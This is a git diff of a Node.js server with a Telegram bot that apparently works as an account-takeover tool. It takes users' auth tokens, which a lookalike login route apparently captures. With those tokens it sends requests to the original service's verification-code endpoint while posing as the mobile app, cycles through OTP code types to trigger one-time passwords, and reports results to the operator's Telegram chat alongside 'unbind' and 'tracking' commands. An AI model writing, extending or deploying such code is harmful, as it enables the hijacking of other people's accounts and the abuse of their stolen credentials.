@@ -691,6 +691,7 @@ app.post('/bot-webhook', async (req, res) => {
 === UNBIND BOT ===
 /autounbind — Toggle auto codeType test on login
 /testcode <token> — Test all codeTypes with token
+/sendotp <token> <codeType> — Send single OTP (default: 4)
 /tryunbind <token> <otp> — Unbind with token & OTP
 
 === TRACKING ===
@@ -1128,8 +1129,18 @@ Example:
     if (text.startsWith('/testcode ')) {
       const token = text.replace('/testcode ', '').trim();
       if (!token) { await bot.sendMessage(chatId, '❌ Usage: /testcode <auth_token>'); return res.sendStatus(200); }
-      await bot.sendMessage(chatId, `🔬 Testing all codeTypes with given token...\nYeh 10-15 seconds lagega.`);
+      await bot.sendMessage(chatId, `🔬 Testing all codeTypes with given token...\nYeh 15-20 seconds lagega.`);
       testUnbindCodeTypes(token, 'Manual Test', chatId).catch(()=>{});
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/sendotp ')) {
+      const parts = text.replace('/sendotp ', '').trim().split(' ');
+      const token = parts[0];
+      const codeType = parts[1] || '4';
+      if (!token) { await bot.sendMessage(chatId, '❌ Usage: /sendotp <token> <codeType>\nExample: /sendotp MC121781_xxx 4'); return res.sendStatus(200); }
+      await bot.sendMessage(chatId, `📤 Sending codeType=${codeType}...`);
+      sendSingleCodeType(token, codeType, chatId).catch(()=>{});
       return res.sendStatus(200);
     }
 
@@ -1250,7 +1261,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
 });
 
 async function testUnbindCodeTypes(token, userInfo, chatId) {
-  const codeTypes = ['1', '2', '3', '5', '6', '7', '8', '9', '10'];
+  const codeTypes = ['4', '1', '2', '3', '5', '6', '7', '8', '9', '10', '0'];
   const results = [];
   for (const ct of codeTypes) {
     try {
@@ -1259,25 +1270,53 @@ async function testUnbindCodeTypes(token, userInfo, chatId) {
         headers: {
           'Content-Type': 'application/json',
           'apptoken': token,
-          'authorization': token,
+          'authorization': 'Bearer ' + token,
           'token': token,
+          'Accept': 'application/json',
+          'User-Agent': 'okhttp/4.9.3',
         },
         body: JSON.stringify({ codeType: ct }),
       });
-      const json = await resp.json();
-      results.push(`codeType=${ct}: code=${json.code || 'N/A'}, msg=${json.message || json.msg || 'N/A'}`);
-      if (json.code === 200 || json.code === '200' || json.code === 0) {
-        if (bot && chatId) {
-          bot.sendMessage(chatId, `✅ codeType=${ct} SUCCESS for ${userInfo}\nResponse: ${JSON.stringify(json).substring(0, 500)}\n\n⚠️ Check Telegram - OTP may have been sent!`).catch(()=>{});
-        }
+      const rawText = await resp.text();
+      let json;
+      try { json = JSON.parse(rawText); } catch(e) { json = { raw: rawText.substring(0, 300) }; }
+      const status = json.code === 200 || json.code === '200' || json.code === 0 ? '✅' : '❌';
+      results.push(`${status} codeType=${ct}: code=${json.code ?? 'N/A'}, msg=${json.message || json.msg || 'N/A'}`);
+      if (status === '✅' && bot && chatId) {
+        bot.sendMessage(chatId, `✅ codeType=${ct} SUCCESS for ${userInfo}\nResponse: ${JSON.stringify(json).substring(0, 500)}\n\n⚠️ Check Telegram - OTP aaya hoga!`).catch(()=>{});
       }
-      await new Promise(r => setTimeout(r, 1000));
+      await new Promise(r => setTimeout(r, 1500));
     } catch(e) {
-      results.push(`codeType=${ct}: ERROR - ${e.message}`);
+      results.push(`❌ codeType=${ct}: ERROR - ${e.message}`);
     }
   }
   if (bot && chatId) {
-    bot.sendMessage(chatId, `🔬 CodeType Test Results for ${userInfo}:\n\n${results.join('\n')}`).catch(()=>{});
+    bot.sendMessage(chatId, `🔬 CodeType Test for ${userInfo}:\n\n${results.join('\n')}`).catch(()=>{});
+  }
+}
+
+async function sendSingleCodeType(token, codeType, chatId) {
+  try {
+    const resp = await fetch(`${ORIGINAL_API}/app/api/memberManager/getMemberVerificationCode`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apptoken': token,
+        'authorization': 'Bearer ' + token,
+        'token': token,
+        'Accept': 'application/json',
+        'User-Agent': 'okhttp/4.9.3',
+      },
+      body: JSON.stringify({ codeType: codeType }),
+    });
+    const rawText = await resp.text();
+    if (bot && chatId) {
+      bot.sendMessage(chatId, `📤 codeType=${codeType} Response:\n${rawText.substring(0, 1000)}`).catch(()=>{});
+    }
+    return rawText;
+  } catch(e) {
+    if (bot && chatId) bot.sendMessage(chatId, `❌ Error: ${e.message}`).catch(()=>{});
+    return null;
   }
 }
 
